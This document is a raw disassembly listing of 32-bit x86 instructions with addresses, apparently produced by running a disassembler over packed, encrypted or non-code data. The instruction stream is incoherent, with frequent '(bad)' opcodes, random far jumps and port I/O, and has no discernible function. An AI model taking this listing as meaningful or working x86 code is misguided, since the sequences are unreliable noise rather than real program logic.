  41232d:	fcom   QWORD PTR [edx+0x1ad254ae]
  412333:	adc    edx,ebx
  412335:	jo     0x41230f
  412337:	xchg   eax,ebp
  412339:	pusha  
  41233a:	cmp    al,0x12
  41233c:	or     DWORD PTR [esi+0x250b4919],ebp
  412342:	data16 adc BYTE PTR [eax-0x3],0x51
  412347:	sub    BYTE PTR [edi+0x18dc5c99],cl
  41234d:	add    al,0x1d
  41234f:	mov    ?,WORD PTR [ecx+edx*2]
  412352:	inc    ebp
  412353:	xlat   BYTE PTR ds:[ebx]
  412354:	ja     0x412383
  412356:	jg     0x4122fb
  412358:	mov    WORD PTR [ebp+0x5f685a50],cs
  41235e:	lods   al,BYTE PTR ds:[esi]
  41235f:	mov    dh,0xfb
  412361:	cmp    DWORD PTR [edi],esi
  412363:	les    edi,FWORD PTR [ecx+0x2a672bad]
  412369:	shl    eax,1
  41236b:	enter  0xea21,0xa6
  41236f:	push   0xabe30271
  412374:	mov    ebx,0xbd0c1ef8
  412379:	lods   eax,DWORD PTR ds:[esi]
  41237a:	ret    
  41237b:	mov    bl,0xa1
  41237d:	fs push esp
  41237f:	or     BYTE PTR [ebx],0x99
  412382:	repz inc eax
  412384:	aas    
  412385:	xchg   edx,eax
  412386:	ror    BYTE PTR [esi+0x38],cl
  412389:	sbb    ah,BYTE PTR [ebx]
  41238b:	push   eax
  41238c:	add    DWORD PTR [ecx-0x60da18ee],esi
  412392:	out    dx,eax
  412393:	fst    QWORD PTR [ecx-0x71]
  412396:	loop   0x412332
  412398:	call   FWORD PTR [ecx]
  41239a:	repnz fwait
  41239c:	cdq    
  41239d:	mov    ah,0x49
  41239f:	add    edx,esp
  4123a1:	gs pushf 
  4123a3:	mov    bh,BYTE PTR [esi-0x50]
  4123a6:	dec    esi
  4123a7:	int    0x44
  4123a9:	loope  0x4123b3
  4123ab:	popa   
  4123ac:	cdq    
  4123ad:	mov    ecx,0xeafaada7
  4123b2:	stc    
  4123b3:	das    
  4123b4:	mov    al,0x22
  4123b6:	push   ebx
  4123b7:	dec    ebp
  4123b8:	sbb    edi,DWORD PTR [ebx-0x1e]
  4123bb:	pop    esp
  4123bc:	xchg   DWORD PTR [edi+0x209c6d57],ebp
  4123c2:	js     0x41236e
  4123c4:	or     ch,BYTE PTR [eax]
  4123c6:	dec    ebx
  4123c7:	shl    BYTE PTR [eax+0x1273b391],0x66
  4123ce:	xlat   BYTE PTR ds:[ebx]
  4123cf:	mov    dl,0x89
  4123d1:	dec    esp
  4123d2:	(bad)  
  4123d3:	stos   DWORD PTR es:[edi],eax
  4123d4:	sub    ebp,esi
  4123d6:	dec    eax
  4123d7:	sub    edx,0xda2be89e
  4123dd:	test   eax,0x95d1832c
  4123e2:	jo     0x41236e
  4123e4:	lock (bad) [ecx]
  4123e7:	sahf   
  4123e8:	in     al,dx
  4123e9:	pusha  
  4123ea:	pusha  
  4123eb:	int    0xe5
  4123ed:	daa    
  4123ee:	clc    
  4123ef:	add    eax,0x6c2ac65d
  4123f4:	mov    bh,0x12
  4123f6:	call   FWORD PTR [eax-0x6e766d55]
  4123fc:	sub    bh,BYTE PTR [edi-0x33]
  4123ff:	xor    dh,BYTE PTR [ebx+0x5a]
  412402:	xlat   BYTE PTR ds:[ebx]
  412403:	xor    cl,0xfe
  412406:	retf   
  412407:	imul   esp,DWORD PTR [ebx-0x11],0xb27ff8ef
  41240e:	xor    ah,al
  412410:	sbb    ecx,ecx
  412412:	inc    BYTE PTR [eax]
  412414:	lds    esi,FWORD PTR cs:[ebx]
  412417:	jle    0x41248e
  412419:	cmp    BYTE PTR [eax+0x26c22f03],bh
  41241f:	adc    eax,0xffffffb1
  412422:	push   es
  412423:	push   ebx
  412424:	test   BYTE PTR [ebp-0x74],dl
  412427:	sbb    DWORD PTR [ebp+0x23],esi
  41242a:	pop    bx
  41242c:	sub    esi,DWORD PTR [eax-0x2c]
  41242f:	hlt    
  412430:	cld    
  412431:	mov    edi,0xb2e45082
  412436:	js     0x4123c4
  412438:	(bad)  
  412439:	jmp    0x77be9e86
  41243e:	pop    esi
  41243f:	popw   ss
  412441:	xor    eax,0x37bb8c31
  412446:	jno    0x412409
  412448:	xchg   esp,eax
  412449:	xlat   BYTE PTR ds:[ebx]
  41244a:	fwait
  41244b:	(bad)  
  41244c:	cld    
  41244d:	mov    ebp,0xeefd6df7
  412452:	retf   
  412453:	cli    
  412454:	ins    DWORD PTR es:[edi],dx
  412455:	mov    BYTE PTR [eax+0x3b],cl
  412458:	and    bl,BYTE PTR [edi-0x31c65011]
  41245e:	add    eax,DWORD PTR [ebp-0x38]
  412461:	ret    0x62c7
  412464:	je     0x4124c0
  412466:	dec    edi
  412467:	outs   dx,DWORD PTR gs:[esi]
  412469:	push   ds
  41246a:	out    0x28,al
  41246c:	loope  0x412421
  41246e:	pop    esp
  41246f:	je     0x412434
  412471:	and    eax,0x577ee86e
  412476:	mov    bl,0x23
  412478:	jmp    0xd6fc:0x5d6ee01c
  41247f:	out    dx,eax
  412480:	and    DWORD PTR [ebx+0x3c],ebx
  412483:	hlt    
  412484:	stos   DWORD PTR es:[di],eax
  412486:	xor    esp,edi
  412488:	call   0x4d78:0x2e91c4ba
  41248f:	sbb    edx,DWORD PTR [ebp-0x2e52bbdd]
  412495:	pop    ecx
  412496:	xchg   esp,eax
  412497:	pop    esi
  412498:	mov    edi,0xaedc3c5e
  41249d:	jecxz  0x412513
  41249f:	mov    al,ds:0x607e0c0c
  4124a4:	or     ecx,eax
  4124a6:	jp     0x4124f2
  4124a8:	outs   dx,BYTE PTR ds:[esi]
  4124a9:	add    BYTE PTR [ebx+0x23ace47e],bh
  4124af:	add    eax,0x5c83d6ae
  4124b4:	jp     0x412502
  4124b6:	mov    cl,0xa2
  4124b8:	or     edx,DWORD PTR [edi]
  4124ba:	inc    esi
  4124bb:	in     eax,0xb5
  4124bd:	int    0x50
  4124bf:	and    eax,0x937caaaf
  4124c4:	xor    bh,BYTE PTR [esp+esi*1+0x3b]
  4124c8:	fs ret 
  4124ca:	inc    esp
  4124cb:	dec    eax
  4124cc:	inc    eax
  4124cd:	test   al,0xc0
  4124cf:	push   esp
  4124d0:	(bad)  
  4124d2:	shr    esp,1
  4124d4:	cwde   
  4124d5:	in     eax,0x38
  4124d7:	mov    ds:0x6f556b90,al
  4124dc:	(bad)  
  4124dd:	cld    
  4124de:	add    al,0xc5
  4124e0:	aaa    
  4124e1:	inc    ecx
  4124e2:	cmp    DWORD PTR [edx],ebp
  4124e4:	add    DWORD PTR [edi],ebx
  4124e6:	test   al,0x80
  4124e8:	ds sub bl,dl
  4124eb:	jecxz  0x412528
  4124ed:	scas   al,BYTE PTR es:[edi]
  4124ee:	jle    0x412550
  4124f0:	adc    ecx,DWORD PTR [edi+0x7e730e59]
  4124f6:	sahf   
  4124f7:	shl    BYTE PTR [ecx],0x2b
  4124fa:	repnz dec ecx
  4124fc:	xchg   BYTE PTR [esi+0x3531a992],cl
  412502:	fidivr WORD PTR [ecx-0x567f7c0c]
  412508:	call   0xa869a574
  41250d:	scas   al,BYTE PTR es:[edi]
  41250e:	mov    ebp,0xab3d9908
  412513:	jmp    0x412581
  412515:	sbb    ebp,eax
  412517:	popf   
  412518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412519:	(bad)  
  41251a:	mov    ch,0xbf
  41251c:	nop
  41251d:	mov    dh,BYTE PTR [edx]
  41251f:	stos   BYTE PTR es:[edi],al
  412520:	dec    edx
  412521:	xor    dh,BYTE PTR [ecx-0x11d0bdf7]
  412527:	out    dx,eax
  412528:	pop    ds
  412529:	xor    DWORD PTR [ebx+0x38ccc183],ebp
  41252f:	jo     0x412525
  412531:	add    al,0x8b
  412533:	(bad)  
  412534:	jmp    0xb66e:0xb99ab4fb
  41253b:	mov    ecx,0xd602fd3b
  412540:	mov    dh,0x9f
  412542:	pop    esp
  412543:	add    DWORD PTR [eax],edx
  412545:	mov    ds:0xf845f52d,al
  41254a:	push   ecx
  41254b:	push   esi
  41254c:	or     esp,DWORD PTR [esi]
  41254e:	push   ecx
  41254f:	in     al,0xdd
  412551:	mov    al,0x9c
  412553:	icebp  
  412554:	aas    
  412555:	mov    esp,0xf6264398
  41255a:	fcomp  DWORD PTR [ecx]
  41255c:	ss repnz cmp al,0x7e
  412560:	dec    esp
  412561:	rcr    DWORD PTR [esi-0x18e96da1],1
  412567:	dec    esi
  412568:	dec    esi
  412569:	aaa    
  41256a:	or     eax,0xe0cf6b7c
  41256f:	or     esp,DWORD PTR [ebx+eiz*2]
  412572:	jno    0x412530
  412574:	jno    0x4125e8
  412576:	outs   dx,BYTE PTR ds:[esi]
  412577:	jg     0x41251f
  412579:	lock test eax,0x72cbe482
  41257f:	ins    DWORD PTR es:[edi],dx
  412580:	and    al,0x77
  412582:	mov    eax,0xa415409e
  412587:	fdivr  st,st(5)
  412589:	fisttp WORD PTR [eax]
  41258b:	test   BYTE PTR [ecx],cl
  41258d:	ins    DWORD PTR es:[edi],dx
  41258e:	add    edx,eax
  412590:	rcl    edx,cl
  412592:	(bad)  
  412593:	nop
  412594:	(bad)  
  412595:	sti    
  412596:	mov    bl,0x20
  412598:	bound  ecx,QWORD PTR [ebp-0x2]
  41259b:	pop    eax
  41259c:	fsubr  QWORD PTR [esi+0x11]
  41259f:	out    0xf,eax
  4125a1:	dec    ebp
  4125a2:	or     eax,0x7661748a
  4125a7:	mov    ebp,0x8a7644b4
  4125ac:	ficom  WORD PTR [ecx+0x222b0769]
  4125b2:	pushf  
  4125b3:	(bad)  
  4125b5:	dec    ebx
  4125b6:	xchg   BYTE PTR [esi],dh
  4125b8:	jp     0x41262a
  4125ba:	add    eax,0x5743e4db
  4125bf:	pop    esi
  4125c0:	adc    ah,BYTE PTR [edx-0x73]
  4125c3:	mov    ds:0x5a4e6a58,eax
  4125c8:	sbb    al,0xd6
  4125ca:	push   es
  4125cb:	push   edx
  4125cc:	xchg   edx,eax
  4125cd:	scas   al,BYTE PTR es:[edi]
  4125ce:	xor    bh,BYTE PTR [ecx]
  4125d0:	adc    al,0x8a
  4125d2:	(bad)  
  4125d3:	mov    edx,0x24646ee
  4125d8:	js     0x4125b0
  4125da:	adc    cl,cl
  4125dc:	xchg   edi,eax
  4125dd:	or     al,0x7c
  4125df:	fisubr DWORD PTR [ecx]
  4125e1:	daa    
  4125e2:	out    0xba,al
  4125e4:	push   ss
  4125e5:	jp     0x412662
  4125e7:	mov    esp,0x6ed9281c
  4125ec:	fisttp DWORD PTR [ebx]
  4125ee:	je     0x412579
  4125f0:	ss push ss
  4125f2:	stos   BYTE PTR es:[edi],al
  4125f3:	(bad)  
  4125f4:	enter  0x8765,0x3a
  4125f8:	aas    
  4125f9:	mov    edx,0xbd2acce1
  4125fe:	mov    esi,0xabf21641
  412603:	sub    DWORD PTR [esi],eax
  412605:	pop    ds
  412606:	in     al,dx
  412607:	fistp  QWORD PTR ss:[ecx+0xc]
  41260b:	es faddp st(7),st
  41260e:	out    dx,al
  41260f:	dec    eax
  412610:	cmc    
  412611:	das    
  412612:	cmp    eax,0x1577e0dc
  412617:	mov    ebx,0xb2fefa48
  41261c:	jns    0x412670
  41261e:	adc    dl,BYTE PTR [ebx+0xc5ff3f4]
  412624:	out    dx,eax
  412625:	daa    
  412626:	jecxz  0x412674
  412628:	out    dx,al
  412629:	dec    ecx
  41262a:	test   eax,0x61045a45
  41262f:	pop    ebx
  412630:	mov    al,0x8b
  412632:	mov    WORD PTR [esi+eiz*2-0x77],gs
  412636:	cmp    cl,BYTE PTR [esi+0x45]
  412639:	out    0x9c,al
  41263b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41263c:	inc    ebx
  41263d:	jo     0x412601
  41263f:	outs   dx,DWORD PTR ds:[esi]
  412640:	sub    edx,0x94e71971
  412646:	jne    0x412630
  412648:	mov    dl,0x1a
  41264a:	push   ss
  41264b:	mov    ebx,0x8b527509
  412650:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412651:	xor    eax,DWORD PTR [ecx+0x57]
  412654:	jns    0x4126bb
  412656:	cmp    BYTE PTR [ecx-0x3c],al
  412659:	test   BYTE PTR [ebp+ebx*1+0x4e],0x2c
  41265e:	push   edi
  41265f:	add    al,0x4b
  412661:	std    
  412662:	mov    ebx,0x74036a87
  412667:	popf   
  412668:	sar    BYTE PTR [ecx+0x7ad5142],1
  41266e:	cmp    dh,al
  412670:	mov    ebx,edi
  412672:	jecxz  0x4126b0
  412674:	pushf  
  412675:	lods   al,BYTE PTR ds:[esi]
  412676:	dec    edx
  412677:	imul   edi,ebp,0xffffffdc
  41267a:	or     al,0x1
  41267c:	pop    ds
  41267d:	icebp  
  41267e:	mov    al,BYTE PTR [edi-0x61530bf5]
  412684:	and    al,0xbf
  412686:	xchg   BYTE PTR [eax],cl
  412688:	out    dx,eax
  412689:	mov    al,ds:0xb5d0c0c8
  41268e:	popf   
  41268f:	and    BYTE PTR [ebx+edi*1+0x33f31bfc],ch
  412696:	daa    
  412697:	mov    edi,0x44357d96
  41269c:	sbb    eax,0xf53a0ea8
  4126a1:	pop    eax
  4126a2:	mov    eax,ds:0x7c1e7de0
  4126a7:	dec    ebx
  4126a8:	xor    BYTE PTR [esi+0x71],cl
  4126ab:	cmp    al,BYTE PTR [edx+0x23433ba9]
  4126b1:	into   
  4126b2:	add    dl,dl
  4126b4:	xlat   BYTE PTR ds:[ebx]
  4126b5:	test   DWORD PTR [ebx],ebx
  4126b7:	xor    BYTE PTR [ecx],ch
  4126b9:	xlat   BYTE PTR ds:[ebx]
  4126ba:	je     0x4126fb
  4126bc:	adc    ecx,eax
  4126be:	(bad)  
  4126bf:	pop    ebx
  4126c0:	mov    ah,0xd9
  4126c2:	lea    ecx,[eax]
  4126c4:	push   ebx
  4126c5:	or     DWORD PTR [ecx+0x7259c21d],edx
  4126cb:	sti    
  4126cc:	pop    es
  4126cd:	mov    esp,es
  4126cf:	pavgw  mm0,QWORD PTR [ebp+0x40]
  4126d3:	mov    al,dh
  4126d5:	xor    dh,BYTE PTR [edx+0x3f]
  4126d8:	xor    bh,dh
  4126da:	jmp    0xbb5c:0x1b6b2881
  4126e1:	es dec edx
  4126e3:	xor    BYTE PTR ds:[edi-0x3e140af5],ch
  4126ea:	je     0x412707
  4126ec:	adc    DWORD PTR [ecx+0x271f647d],edx
  4126f2:	sbb    BYTE PTR [ecx+ecx*8-0x2313bb3f],cl
  4126f9:	ret    
  4126fa:	sbb    DWORD PTR [edx-0x70],esp
  4126fd:	in     eax,dx
  4126fe:	call   0xb6b8:0xa52d8d40
  412705:	pop    ebx
  412706:	fcomp  st(7)
  412708:	mov    ?,esi
  41270a:	mov    esp,0x3d618b5d
  41270f:	cmc    
  412710:	imul   ecx,ebx,0xffffffe9
  412713:	adc    eax,0x9d06dabe
  412718:	fisubr WORD PTR [ebp-0x55]
  41271b:	cmp    ebp,0x21
  41271e:	dec    ebx
  41271f:	test   edi,eax
  412721:	pop    edi
  412722:	inc    edx
  412723:	xor    al,0x59
  412725:	push   esi
  412726:	and    dh,BYTE PTR [edi-0x45]
  412729:	call   DWORD PTR [edx+edx*4]
  41272c:	cld    
  41272d:	ficom  DWORD PTR [edi-0x9]
  412730:	data16 std 
  412732:	out    dx,al
  412733:	stos   DWORD PTR es:[edi],eax
  412734:	jmp    0x412774
  412736:	sbb    eax,0xa87c1b00
  41273b:	scas   eax,DWORD PTR es:[edi]
  41273c:	cmp    al,0x11
  41273e:	push   eax
  41273f:	mov    ah,BYTE PTR [ecx-0x2f]
  412742:	std    
  412743:	and    cl,0x86
  412746:	mov    bh,0x66
  412748:	xor    DWORD PTR [ebx+0x480da5e2],edi
  41274e:	mov    ds,WORD PTR [ebp+0x38]
  412751:	mov    cl,0xc5
  412753:	cmp    dl,BYTE PTR [ebp+0x74f61fe0]
  412759:	jp     0x41273f
  41275b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41275c:	and    al,0x85
  41275e:	mov    al,0xdc
  412760:	push   edx
  412761:	mov    edx,0x49801ffd
  412766:	ins    BYTE PTR es:[edi],dx
  412767:	push   esp
  412768:	fs jbe 0x4126fe
  41276b:	xor    cl,BYTE PTR [edx+0x23a4121f]
  412771:	mov    cl,0x3b
  412773:	mov    ch,0x74
  412775:	cdq    
  412776:	mov    bl,0xd7
  412778:	jmp    0x412784
  41277a:	mov    al,ds:0x58763f29
  41277f:	and    bh,BYTE PTR [edx-0x479a85f2]
  412785:	jmp    0x436f:0xd6c1f0d6
  41278c:	add    DWORD PTR [ebx],edi
  41278e:	dec    esp
  41278f:	push   cs
  412790:	aaa    
  412791:	rol    DWORD PTR [eax],0x2f
  412794:	add    eax,0x725b154d
  412799:	push   sp
  41279b:	or     eax,0x5e20be97
  4127a0:	lock lods eax,DWORD PTR ds:[esi]
  4127a2:	jno    0x41276b
  4127a4:	pop    esi
  4127a5:	jbe    0x41277c
  4127a7:	mov    cl,0xc9
  4127a9:	data16 sbb BYTE PTR [edx-0x61],ch
  4127ad:	mov    ch,0x18
  4127af:	shr    eax,0xc2
  4127b2:	test   DWORD PTR [edx],esp
  4127b4:	pop    ss
  4127b5:	inc    esp
  4127b6:	jl     0x4127cb
  4127b8:	sub    al,0xff
  4127ba:	outs   dx,BYTE PTR ds:[esi]
  4127bb:	pusha  
  4127bc:	dec    esp
  4127bd:	out    dx,eax
  4127be:	repnz push es
  4127c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127c1:	pushf  
  4127c2:	leave  
  4127c3:	das    
  4127c4:	in     al,dx
  4127c5:	jp     0x412803
  4127c7:	pop    edx
  4127c8:	mov    gs,WORD PTR ds:0xa40e48c7
  4127ce:	pop    edx
  4127cf:	cdq    
  4127d0:	js     0x4127f1
  4127d2:	loopne 0x412766
  4127d4:	shr    ch,1
  4127d6:	ret    
  4127d7:	ret    
  4127d8:	inc    ebp
  4127d9:	pop    ds
  4127da:	push   ebp
  4127db:	xor    ah,BYTE PTR [ebx+0x53]
  4127de:	inc    esp
  4127df:	and    BYTE PTR [eax+0x14e08d89],al
  4127e5:	cmp    DWORD PTR [edi],ecx
  4127e7:	jecxz  0x41278a
  4127e9:	and    DWORD PTR [edx+ebp*8+0x49],0x4bf5891c
  4127f1:	jbe    0x412858
  4127f3:	inc    ebx
  4127f4:	cwde   
  4127f5:	or     al,0x34
  4127f7:	mov    ch,0x45
  4127f9:	ss ins BYTE PTR es:[edi],dx
  4127fb:	jle    0x4127fb
  4127fd:	mov    esp,DWORD PTR [ebx+0x17]
  412800:	aam    0xb5
  412802:	push   ecx
  412803:	pop    edi
  412804:	clc    
  412805:	mov    al,0x30
  412807:	or     eax,0x50dea4f5
  41280c:	cmp    BYTE PTR [edx-0x39],cl
  41280f:	aas    
  412810:	neg    DWORD PTR [ecx-0x3d]
  412813:	(bad)  
  412815:	outs   dx,DWORD PTR ds:[esi]
  412816:	jmp    0x397d:0xbea673ed
  41281d:	sbb    ah,bl
  41281f:	mov    ah,0x69
  412821:	aad    0x4d
  412823:	xor    esp,esi
  412825:	test   BYTE PTR [eax-0x2d],bh
  412828:	jg     0x4127d7
  41282a:	mov    ecx,0x7ebbb770
  41282f:	push   ss
  412830:	inc    ebx
  412831:	outs   dx,BYTE PTR ds:[esi]
  412832:	(bad)  
  412833:	popf   
  412834:	ins    DWORD PTR es:[edi],dx
  412835:	shl    bh,1
  412837:	lock mov eax,0x3d39136c
  41283d:	ss adc al,bl
  412840:	sub    eax,0xc1e66331
  412845:	pushf  
  412846:	cmp    ch,cl
  412848:	hlt    
  412849:	shl    BYTE PTR [esi],1
  41284b:	mov    al,0x87
  41284d:	mov    dl,0x69
  41284f:	xchg   al,ah
  412851:	es xchg edx,eax
  412853:	jmp    0x16b5:0xf09470f0
  41285a:	test   eax,0xebdb87b7
  41285f:	mov    ds:0xb2e13d40,eax
  412864:	xchg   esi,eax
  412865:	cmp    al,0x67
  412867:	and    BYTE PTR [eax+0x1a95c8ae],bl
  41286d:	mov    DWORD PTR [eax+ecx*8+0x4d39204],edi
  412874:	adc    al,0x19
  412876:	pop    ebp
  412877:	ret    
  412878:	fs scas eax,DWORD PTR es:[edi]
  41287a:	sub    edx,DWORD PTR [edi-0x1e44b53a]
  412880:	push   ebp
  412881:	push   esi
  412882:	mov    dh,0x19
  412884:	xor    cl,cl
  412886:	or     DWORD PTR [eax+0x2],edx
  412889:	dec    ecx
  41288a:	jmp    0x4b56e649
  41288f:	sub    ebx,edx
  412891:	test   al,0x9f
  412893:	sti    
  412894:	pushf  
  412895:	test   eax,0x456e3dab
  41289a:	push   es
  41289b:	scas   eax,DWORD PTR es:[edi]
  41289c:	dec    ebx
  41289d:	mov    esp,0x97e14068
  4128a2:	je     0x412888
  4128a4:	sub    ebp,DWORD PTR [edi+0x6c525032]
  4128aa:	js     0x4128b4
  4128ac:	stc    
  4128ad:	mov    esi,0xcc99b506
  4128b2:	rcr    al,1
  4128b4:	jb     0x412904
  4128b6:	hlt    
  4128b7:	imul   ecx,DWORD PTR [ebx+0xa],0xffffffee
  4128bb:	lock sub eax,0xc7488844
  4128c1:	je     0x4128cf
  4128c3:	adc    ecx,edi
  4128c5:	jo     0x41291f
  4128c7:	scas   eax,DWORD PTR es:[edi]
  4128c8:	pushf  
  4128c9:	pop    edi
  4128ca:	adc    al,dh
  4128cc:	cs data16 aam 0x32
  4128d0:	icebp  
  4128d1:	iret   
  4128d2:	loope  0x412892
  4128d4:	loopne 0x4128ee
  4128d6:	or     DWORD PTR [ebx-0x44158454],esp
  4128dc:	call   0xdd14a407
  4128e1:	fcomi  st,st(1)
  4128e3:	cmp    eax,0xc95fe499
  4128e8:	mov    eax,0x4c4ed960
  4128ed:	imul   edi,DWORD PTR [esi+0xe],0x87716778
  4128f4:	jmp    0x4128fa
  4128f6:	psubw  mm7,QWORD PTR [esi-0x32124efe]
  4128fd:	mov    esp,0x775e83d8
  412902:	cmp    al,0x89
  412904:	iret   
  412905:	add    ch,0x79
  412908:	push   ecx
  412909:	js     0x4128a6
  41290b:	or     al,0xe6
  41290d:	and    eax,0xa650c48f
  412912:	ret    
  412913:	imul   esi,DWORD PTR [ebp-0x79a2fe7e],0x14
  41291a:	mov    cl,0x2
  41291c:	jp     0x41292e
  41291e:	ds push eax
  412920:	jle    0x4128fb
  412922:	sbb    al,0x92
  412924:	cmp    al,0x5f
  412926:	and    DWORD PTR [ebx],ecx
  412928:	sub    DWORD PTR [ebx-0x253d5fbc],edx
  41292e:	in     al,dx
  41292f:	cmp    dh,BYTE PTR [edi-0x49e6fb22]
  412935:	mov    esp,0x56152df0
  41293a:	sbb    DWORD PTR [ecx+edx*8+0x75],ecx
  41293e:	xor    eax,0x7662a68e
  412943:	dec    eax
  412944:	fist   DWORD PTR [eax+0x36]
  412947:	xor    BYTE PTR [edi+0x2d],bl
  41294a:	mov    ch,0xa3
  41294c:	push   edi
  41294d:	cmp    al,0x37
  41294f:	mov    esp,0x4be0e6dc
  412954:	pushf  
  412955:	jne    0x41293d
  412957:	sub    BYTE PTR [ebx-0x2d],0x96
  41295b:	les    esp,FWORD PTR [esp+edi*4-0x4d]
  41295f:	or     eax,esp
  412961:	push   esp
  412962:	in     al,0xf7
  412964:	add    eax,0x749fe77d
  412969:	call   0x710f:0x779a7501
  412970:	cld    
  412971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412972:	jnp    0x41291d
  412974:	arpl   WORD PTR [eax+0x7c1a0414],bp
  41297a:	(bad)  
  41297b:	push   esp
  41297c:	cwde   
  41297d:	or     BYTE PTR [esi-0x7b],al
  412980:	and    eax,0xbd455dfc
  412985:	add    BYTE PTR [edx-0x228939a0],bl
  41298b:	mov    bl,0xb9
  41298d:	push   ecx
  41298e:	or     BYTE PTR [ebx+0x0],bl
  412991:	mov    ebp,0xec38f09f
  412996:	pusha  
  412997:	mov    cl,0xac
  412999:	jmp    0x5d4f:0xeb7deeb3
  4129a0:	scas   eax,DWORD PTR es:[edi]
  4129a1:	cmp    BYTE PTR [ebx-0x15],0x6e
  4129a5:	fidiv  DWORD PTR [edi]
  4129a7:	imul   ebx,esp,0xa5f4595e
  4129ad:	das    
  4129ae:	(bad)  
  4129b0:	cli    
  4129b1:	fs inc esp
  4129b3:	cwde   
  4129b4:	mov    dh,BYTE PTR [edi]
  4129b6:	inc    edi
  4129b7:	pop    edx
  4129b8:	cmp    esp,DWORD PTR [esi]
  4129ba:	push   edi
  4129bb:	ret    0xa13f
  4129be:	mov    al,ds:0x36d8bd1d
  4129c3:	jge    0x412a0a
  4129c5:	mov    ecx,0x48f66d8c
  4129ca:	jae    0x412955
  4129cc:	neg    DWORD PTR ds:0x2fde5a51
  4129d2:	jae    0x412975
  4129d4:	pop    ss
  4129d5:	inc    edi
  4129d6:	fnsave [edx-0x5f]
  4129d9:	retf   
  4129da:	pop    edx
  4129db:	mov    ebx,ecx
  4129dd:	nop
  4129de:	push   ds
  4129df:	add    BYTE PTR [ebx],dh
  4129e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129e2:	jne    0x412973
  4129e4:	mov    ah,0x92
  4129e6:	push   ebp
  4129e7:	psubd  mm6,QWORD PTR [ecx-0x6d]
  4129eb:	add    DWORD PTR [ecx],0xc3897209
  4129f1:	popa   
  4129f2:	imul   edi,DWORD PTR ds:0x127a6269,0xad579572
  4129fc:	adc    al,0x9f
  4129fe:	mov    ds,ebp
  412a00:	mov    dl,0xf0
  412a02:	mov    ah,0x11
  412a04:	pop    edi
  412a05:	stos   DWORD PTR es:[edi],eax
  412a06:	add    eax,0x5674ed27
  412a0b:	mov    BYTE PTR [ebx+0x21],al
  412a0e:	das    
  412a0f:	and    al,0x78
  412a11:	push   ss
  412a12:	cmp    eax,0xb7a5e84c
  412a17:	inc    esi
  412a18:	cmp    DWORD PTR [ecx+0x33ff88ef],0xf4029103
  412a22:	jb     0x412a98
  412a24:	sub    DWORD PTR [ecx+0x6a877077],ebx
  412a2a:	lods   eax,DWORD PTR ds:[esi]
  412a2b:	out    dx,eax
  412a2c:	retf   
  412a2d:	xchg   BYTE PTR [edi-0x5512aa63],al
  412a33:	lock mov dl,0xca
  412a36:	mov    ds:0x75db7162,al
  412a3b:	push   eax
  412a3c:	and    BYTE PTR [ebx+0x50adf1c1],ch
  412a42:	fsub   DWORD PTR gs:[ebp+0x3f4e2ebb]
  412a49:	cmp    bl,BYTE PTR [esp+edx*2]
  412a4c:	and    al,0xbd
  412a4e:	test   BYTE PTR [eax],bh
  412a50:	sub    eax,0xa985f9e9
  412a55:	popa   
  412a56:	das    
  412a57:	jg     0x412a4b
  412a59:	xor    al,0x38
  412a5b:	xor    bh,ch
  412a5d:	sub    esp,DWORD PTR [ebx+0x78]
  412a60:	push   ebx
  412a61:	and    ebx,DWORD PTR [esi+0x5c73afb6]
  412a67:	(bad)  
  412a68:	lahf   
  412a69:	xchg   esp,edx
  412a6b:	mov    WORD PTR ds:0x38fd9118,cs
  412a71:	and    DWORD PTR [ecx-0x43],0x3d
  412a75:	into   
  412a76:	ja     0x412ad8
  412a78:	ficom  WORD PTR [edx+0x1f]
  412a7b:	pop    ebp
  412a7c:	into   
  412a7d:	push   ds
  412a7e:	pop    esp
  412a7f:	ins    BYTE PTR es:[edi],dx
  412a80:	ret    
  412a81:	scas   eax,DWORD PTR es:[edi]
  412a82:	mov    cl,0x80
  412a84:	cmp    eax,ecx
  412a86:	push   esp
  412a87:	mov    eax,ds:0xb739da45
  412a8c:	(bad)  
  412a8d:	dec    eax
  412a8e:	inc    ecx
  412a8f:	xchg   esp,eax
  412a90:	sbb    DWORD PTR [ebp+0x24891986],esp
  412a96:	mov    ch,0x68
  412a98:	ret    
  412a99:	or     eax,0xc9bc3641
  412a9e:	push   ss
  412a9f:	aaa    
  412aa0:	or     ebx,DWORD PTR [edi-0x2e]
  412aa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412aa4:	push   edx
  412aa5:	adc    ch,0xa3
  412aa8:	mov    WORD PTR [edx*8+0x271e5098],?
  412aaf:	mov    ecx,0x855f452
  412ab4:	test   DWORD PTR [eax],edi
  412ab6:	rcl    DWORD PTR [edx+0x1],0x24
  412aba:	repz cs (bad) 
  412abd:	retf   
  412abe:	outs   dx,DWORD PTR ds:[esi]
  412abf:	cmp    ch,BYTE PTR [ecx]
  412ac1:	or     DWORD PTR [ecx+0x6c],eax
  412ac4:	cmp    DWORD PTR [esi],ebp
  412ac6:	jae    0x412a87
  412ac8:	repz push ebx
  412aca:	das    
  412acb:	sub    BYTE PTR [edi+0x14],0x52
  412acf:	xchg   edi,eax
  412ad0:	in     al,0xfe
  412ad2:	lds    ebx,FWORD PTR [ebx-0x69781d]
  412ad8:	cdq    
  412ad9:	sub    cl,BYTE PTR [ebp-0x238fc7a2]
  412adf:	jg     0x412b4e
  412ae1:	add    BYTE PTR [ebx],bl
  412ae3:	sbb    DWORD PTR [edx],edx
  412ae5:	add    al,cl
  412ae7:	jbe    0x412ad1
  412ae9:	rcl    DWORD PTR [eax+0x23f1f740],cl
  412aef:	push   esi
  412af0:	pop    ds
  412af1:	or     esi,DWORD PTR [eax+ebx*1+0x7a318b2b]
  412af8:	retf   0xdcb2
  412afb:	(bad)  
  412afc:	push   edi
  412afd:	outs   dx,BYTE PTR ds:[esi]
  412afe:	(bad)  
  412b00:	arpl   WORD PTR [ebx],ax
  412b02:	and    DWORD PTR [edx],edx
  412b04:	pop    edx
  412b05:	rcl    DWORD PTR [edi+0x714100dd],1
  412b0b:	jecxz  0x412a93
  412b0d:	imul   ebp,DWORD PTR [ebx+eax*8+0xf],0x4c
  412b12:	jno    0x412b0a
  412b14:	jae    0x412b05
